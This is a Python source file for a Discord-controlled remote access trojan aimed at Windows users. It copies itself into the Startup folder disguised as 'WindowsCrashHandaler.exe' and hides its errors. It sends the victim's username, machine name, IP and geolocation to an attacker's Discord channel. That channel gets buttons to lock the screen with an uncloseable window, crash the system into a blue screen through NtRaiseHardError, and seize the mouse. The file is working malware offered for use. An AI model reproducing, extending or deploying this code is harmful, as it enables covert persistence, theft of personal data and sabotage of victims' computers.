import discord
from discord.ext import commands
import tkinter as tk
import threading
import math
import os
import ctypes
import sys
import getpass
import socket
import subprocess
import platform
import psutil
import time
import random
import pyautogui
import requests
import shutil

# Bot setup
add_token = "Self_Explanitory"
NOTIFICATIONS_CHANNEL_ID = "Self_Explanitory"  # this is where the message gets sent 

# Global variable for toggling mouse movement
mousemess = False

client = commands.Bot(command_prefix='!', intents=discord.Intents.all())

### Clone the file to startup as "WindowsCrashHandaler.exe" ###
def clone_to_startup():
    try:
        current_path = sys.argv[0]
        startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        target_path = os.path.join(startup_dir, "WindowsCrashHandaler.exe")
        # Only clone if it doesn't already exist
        if not os.path.exists(target_path):
            shutil.copy(current_path, target_path)
            # Removed print statements for better performance
    except Exception as e:
        pass  # Error is silently ignored as requested

### SCREEN BLOCK FUNCTION ###
def screenblock():
    def on_closing():
        pass  # Prevent closing the window

    box = tk.Tk()
    box.attributes('-fullscreen', True)
    box.attributes('-topmost', True)
    box.configure(background='black')
    box.protocol("WM_DELETE_WINDOW", on_closing)
    box.overrideredirect(True)

    label = tk.Label(box, text="🔒 SCREEN BLOCKED 🔒", font=("Arial", 30, "bold"), fg="white", bg="black")
    label.pack(expand=True)
    box.mainloop()

### ANIMATION FUNCTIONS (for screen block) ###
TIME_INCREMENT = 50
SPIRAL_SPACING = 0.05
ANIMATION_DELAY = 10
ROTATION_INCREMENT = 0.01

def animate():
    global t, rotation_offset, points
    t += TIME_INCREMENT
    angle = math.radians(t)
    radius = 1 + SPIRAL_SPACING * t

    new_x = center_x + radius * math.cos(angle)
    new_y = center_y + radius * math.sin(angle)
    points.append((new_x, new_y))
    
    rotation_offset += ROTATION_INCREMENT
    canvas.delete("all")
    
    rotated_points = []
    for x, y in points:
        rel_x = x - center_x
        rel_y = y - center_y
        rot_x = rel_x * math.cos(rotation_offset) - rel_y * math.sin(rotation_offset)
        rot_y = rel_x * math.sin(rotation_offset) + rel_y * math.cos(rotation_offset)
        final_x = center_x + rot_x
        final_y = center_y + rot_y
        rotated_points.append((final_x, final_y))
    
    for i in range(1, len(rotated_points)):
        x0, y0 = rotated_points[i-1]
        x1, y1 = rotated_points[i]
        canvas.create_line(x0, y0, x1, y1, fill="white", width=2)
    canvas.after(ANIMATION_DELAY, animate)

def screenblock_with_animation():
    global canvas, center_x, center_y, t, points, rotation_offset
    box = tk.Tk()
    box.attributes('-fullscreen', True)
    box.attributes('-topmost', True)
    box.configure(background='black')
    box.protocol("WM_DELETE_WINDOW", lambda: None)
    box.overrideredirect(True)
    
    canvas = tk.Canvas(box, width=box.winfo_screenwidth(), height=box.winfo_screenheight(),
                       bg='black', bd=0, highlightthickness=0)
    canvas.pack()
    
    center_x = box.winfo_screenwidth() / 2
    center_y = box.winfo_screenheight() / 2
    t = 0
    points = []
    rotation_offset = 0
    
    animate()
    box.mainloop()

### LOCATION INFO FUNCTION ###
def get_location():
    """Fetches real-time geolocation data based on public IP."""
    try:
        response = requests.get("http://ip-api.com/json/", timeout=5)
        data = response.json()

        if data.get("status") == "fail":
            return {"Error": "Could not retrieve location data."}

        # Returning a structured dictionary
        location_info = {
            "IP Address": data.get("query", "N/A"),
            "Country": data.get("country", "N/A"),
            "Region": data.get("regionName", "N/A"),
            "City": data.get("city", "N/A"),
            "Latitude, Longitude": f"{data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}",
            "Postal": data.get("zip", "N/A"),
            "ISP": data.get("isp", "N/A"),
            "Organization": data.get("org", "N/A"),
            "AS": data.get("as", "N/A")  # Autonomous system (network)
        }
        return location_info
    except requests.RequestException as e:
        return {"Error": f"Network error: {e}"}

### MOUSE MESS FUNCTION ###
def StartMouseMess():
    global mousemess
    while mousemess:
        x = random.randint(600, 700)
        y = random.randint(600, 700)
        pyautogui.moveTo(x, y, 3)
        time.sleep(1)

### ACTION BUTTONS ###
class ActionButtons(discord.ui.View):
    def __init__(self, username):
        super().__init__(timeout=None)
        self.username = username

    @discord.ui.button(label="Block Screen", style=discord.ButtonStyle.primary, emoji="🔒", row=0)
    async def block_screen(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.guild_permissions.administrator:
            threading.Thread(target=screenblock_with_animation, daemon=True).start()
            await interaction.response.send_message(f"✅ **{self.username}**'s screen has been blocked!", ephemeral=False)
        else:
            await interaction.response.send_message("⛔ You don't have permission to block the screen.", ephemeral=True)

    @discord.ui.button(label="Trigger BSOD", style=discord.ButtonStyle.primary, emoji="💀", row=0)
    async def bsod(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.guild_permissions.administrator:
            try:
                ntdll = ctypes.windll.ntdll
                prev_value = ctypes.c_bool()
                res = ctypes.c_ulong()
                ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
                if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                    await interaction.response.send_message("⚠️ BSOD failed due to an unexpected error.")
                else:
                    await interaction.response.send_message(f"💀 **{self.username}**'s system has been blue screened!")
            except Exception as e:
                await interaction.response.send_message(f"❌ Error: {e}")
        else:
            await interaction.response.send_message("⛔ You don't have permission to trigger the BSOD.", ephemeral=True)

    @discord.ui.button(label="Mess with Mouse", style=discord.ButtonStyle.primary, emoji="🖱️", row=1)
    async def mess_mouse(self, interaction: discord.Interaction, button: discord.ui.Button):
        global mousemess
        if interaction.user.guild_permissions.administrator:
            if not mousemess:
                mousemess = True
                threading.Thread(target=StartMouseMess, daemon=True).start()
                await interaction.response.send_message(f"✅ Started messing with **{self.username}**'s mouse!", ephemeral=False)
            else:
                mousemess = False
                await interaction.response.send_message(f"🛑 Stopped messing with **{self.username}**'s mouse.", ephemeral=False)
        else:
            await interaction.response.send_message("⛔ You don't have permission to mess with the mouse.", ephemeral=True)

### SEND NOTIFICATION WITH RGB EMBED ###
async def send_notification():
    await client.wait_until_ready()
    channel = client.get_channel(NOTIFICATIONS_CHANNEL_ID)
    if channel is None:
        return  # Silently handle the error for now

    username = os.getlogin()
    computer_name = platform.node()
    ip_address = socket.gethostbyname(socket.gethostname())
    os_info = platform.system() + " " + platform.release()
    
    # Get location information using the enhanced get_location function
    location_data = get_location()
    if "Error" in location_data:
        location_text = f"Error fetching location: {location_data['Error']}"
    else:
        location_text = "\n".join([f"**{key}:** {value}" for key, value in location_data.items()])

    # Generate a random RGB color for the embed
    random_color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

    embed = discord.Embed(
        title="💻 System & Location Information",
        description=(
            f"**👤 User:** {username}\n"
            f"**🏠 Computer Name:** {computer_name}\n"
            f"**🌐 IP Address:** {ip_address}\n"
            f"**🖥️ OS Info:** {os_info}\n\n"
            f"**🌍 Location Info:**\n{location_text}"
        ),
        color=random_color
    )
    embed.set_footer(text="System Info", icon_url="https://img-9gag-fun.9cache.com/photo/arm96n0_460s.jpg")

    action_buttons = ActionButtons(username)
    await channel.send(embed=embed, view=action_buttons)

@client.event
async def on_ready():
    print(f"✅ Bot is online as {client.user}")
    clone_to_startup()  # Clone the file to startup with the name "WindowsCrashHandaler.exe"
    await send_notification()

client.run(add_token)
